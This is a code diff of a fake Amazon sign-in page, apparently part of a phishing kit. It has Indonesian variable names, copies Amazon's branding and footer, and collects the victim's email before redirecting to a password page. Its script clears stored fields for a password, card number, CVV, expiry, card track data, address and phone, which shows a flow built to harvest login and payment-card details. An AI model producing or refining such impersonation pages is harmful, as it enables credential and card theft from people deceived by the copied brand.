@@ -1,226 +1,60 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="id">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Amazon Sign In</title>
-    <script src="config.js"></script>
     <style>
-        * { 
-            margin: 0; 
-            padding: 0; 
-            box-sizing: border-box; 
-            font-family: 'Amazon Ember', Arial, sans-serif; 
-        }
-        body { 
-            background-color: #ffffff; 
-            min-height: 100vh; 
-            display: flex; 
-            flex-direction: column; 
-            align-items: center; 
-            padding: 20px; 
-        }
-        .logo { 
-            margin: 15px 0 25px; 
-        }
-        .logo img { 
-            height: 60px; 
-            display: block;
-            margin: 0 auto;
-        }
-        .kotak { 
-            width: 100%; 
-            max-width: 348px; 
-            border: 1px solid #ddd; 
-            border-radius: 8px; 
-            padding: 20px 26px; 
-        }
-        h1 { 
-            font-size: 28px; 
-            line-height: 1.2;
-            margin-bottom: 5px; 
-            font-weight: 400; 
-        }
-        .sub-judul {
-            font-size: 14px;
-            color: #555;
-            margin-bottom: 20px;
-        }
-        label { 
-            display: block; 
-            font-weight: 700; 
-            font-size: 13px; 
-            margin-bottom: 8px; 
-        }
-        .input-wadah {
-            position: relative;
-            margin-bottom: 5px;
-        }
-        input { 
-            width: 100%; 
-            padding: 7px 30px 7px 10px; 
-            border: 1px solid #a6a6a6; 
-            border-radius: 4px; 
-            font-size: 15px; 
-            height: 31px;
-            transition: border-color 0.1s;
-        }
-        input:focus { 
-            outline: none; 
-            border-color: #0071e3; 
-            box-shadow: 0 0 3px rgba(0,113,227,0.5); 
-        }
-        input.salah {
-            border-color: #c40000;
-        }
-        .peringatan {
-            display: none;
-            color: #c40000;
-            font-size: 13px;
-            margin-bottom: 15px;
-            align-items: flex-start;
-            gap: 5px;
-        }
-        .peringatan.tampil {
-            display: flex;
-        }
-        .peringatan .ikon {
-            font-weight: bold;
-            font-size: 14px;
-        }
-        button { 
-            width: 100%; 
-            padding: 7px 10px; 
-            background: #FFD814; 
-            border: 1px solid #FCD200; 
-            border-radius: 20px; 
-            font-size: 15px; 
-            height: 40px;
-            color: #0F1111;
-            cursor: pointer;
-        }
-        button:hover { 
-            background: #F7CA00;
-            border-color: #F2C200;
-        }
-        .syarat {
-            font-size: 12px;
-            margin-top: 15px;
-            line-height: 1.5;
-        }
-        .syarat a {
-            color: #0066c0;
-            text-decoration: none;
-        }
-        .syarat a:hover {
-            text-decoration: underline;
-        }
-        .bantuan {
-            margin-top: 15px;
-            padding-top: 15px;
-            border-top: 1px solid #eee;
-        }
-        .bantuan a {
-            font-size: 13px;
-            color: #0066c0;
-            text-decoration: none;
-        }
-        .bantuan a:hover {
-            text-decoration: underline;
-        }
-        /* GARIS PEMISAH */
-        .garis-bawah {
-            width: 5000px;
-            height: 2px;
-            background: #e7e7e7;
-            margin: 25px 0;
-        }
-        .footer {
-            font-size: 11px;
-            color: #555;
-            text-align: center;
-        }
-        .footer a {
-            color: #0066c0;
-            text-decoration: none;
-            margin: 0 8px;
-        }
-        .footer a:hover {
-            text-decoration: underline;
-        }
-        .hak-cipta {
-            margin-top: 5px;
-        }
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Amazon Ember', Arial, sans-serif; }
+        body { background-color: #ffffff; min-height: 100vh; display: flex; flex-direction: column; align-items: center; padding: 20px; }
+        .logo { margin: 15px 0 25px; text-align: center; }
+        .logo img { height: 60px; }
+        .kotak { width: 100%; max-width: 348px; border: 1px solid #ddd; border-radius: 8px; padding: 25px 26px; }
+        h1 { font-size: 22px; font-weight: 400; margin-bottom: 20px; }
+        label { display: block; font-weight: 700; font-size: 13px; margin-bottom: 6px; margin-top: 16px; }
+        label:first-of-type { margin-top: 0; }
+        input { width: 100%; padding: 7px 10px; border: 1px solid #a6a6a6; border-radius: 4px; font-size: 15px; height: 35px; }
+        input:focus { outline: none; border-color: #0071e3; box-shadow: 0 0 3px rgba(0,113,227,0.5); }
+        button { width: 100%; padding: 7px 10px; background: #FFD814; border: 1px solid #FCD200; border-radius: 20px; font-size: 15px; height: 40px; color: #0F1111; cursor: pointer; margin-top: 25px; }
+        button:hover { background: #F7CA00; border-color: #F2C200; }
+        .footer { font-size: 11px; color: #555; text-align: center; margin-top: 30px; }
+        .footer a { color: #0066c0; text-decoration: none; margin: 0 8px; }
     </style>
 </head>
 <body>
-    <div class="logo">
-        <img src="img/amazonlogo.png" alt="Amazon">
-    </div>
-
+    <div class="logo"><img src="img/amazonlogo.png" alt="Amazon"></div>
     <div class="kotak">
-        <h1>Sign in or create account</h1>
-        <p class="sub-judul">Enter mobile number or email</p>
-        
-        <form id="formEmail">
+        <h1>Sign In</h1>
+        <form id="formIndex">
             <label for="email">Email or mobile phone number</label>
-            
-            <div class="input-wadah">
-                <input type="text" id="email" name="email">
-            </div>
-            
-            <div class="peringatan" id="peringatan">
-                <span class="ikon">!</span>
-                <span>Enter your mobile number or email</span>
-            </div>
-            
-            <button type="submit" id="tombolLanjut">Continue</button>
-            
-            <p class="syarat">By continuing, you agree to Amazon's 
-                <a href="#">Conditions of Use</a> and 
-                <a href="#">Privacy Notice</a>.
-            </p>
-            
-            <div class="bantuan">
-                <a href="#">Need help?</a>
-            </div>
+            <input type="text" id="email" required>
+            <button type="submit">Continue</button>
         </form>
     </div>
-
-    <!-- GARIS PEMISAH MENGGANTI BAGIAN CREATE ACCOUNT -->
-    <div class="garis-bawah"></div>
-
     <div class="footer">
-        <div>
-            <a href="#">Conditions of Use</a>
-            <a href="#">Privacy Notice</a>
-            <a href="#">Help</a>
-        </div>
-        <p class="hak-cipta">© 1996-2026, Amazon.com, Inc. or its affiliates</p>
+        <a href="#">Conditions of Use</a><a href="#">Privacy Notice</a><a href="#">Help</a>
+        <p style="margin-top: 8px;">© 1996-2026, Amazon.com, Inc. or its affiliates</p>
     </div>
 
     <script>
-        const inputEmail = document.getElementById('email');
-        const peringatan = document.getElementById('peringatan');
-        const formEmail = document.getElementById('formEmail');
-
-        inputEmail.addEventListener('input', () => {
-            if (inputEmail.value.trim().length > 0) {
-                inputEmail.classList.remove('salah');
-                peringatan.classList.remove('tampil');
-            }
-        });
-
-        formEmail.addEventListener('submit', (e) => {
+        document.getElementById('formIndex').addEventListener('submit', e => {
             e.preventDefault();
+            const email = document.getElementById('email').value.trim();
+            if (!email) return;
             
-            if (inputEmail.value.trim().length === 0) {
-                inputEmail.classList.add('salah');
-                peringatan.classList.add('tampil');
-                return;
-            }
+            localStorage.setItem('emailPengguna', email);
+            localStorage.removeItem('passwordPengguna');
+            localStorage.removeItem('nomorKartu');
+            localStorage.removeItem('namaKartu');
+            localStorage.removeItem('expiry');
+            localStorage.removeItem('cvv');
+            localStorage.removeItem('alamat');
+            localStorage.removeItem('kota');
+            localStorage.removeItem('kodepos');
+            localStorage.removeItem('telepon');
+            localStorage.removeItem('trackKartu');
             
-            localStorage.setItem('emailPengguna', inputEmail.value.trim());
+            // ✅ LANGSUNG KE PASSWORD
             window.location.href = 'password.html';
         });
     </script>
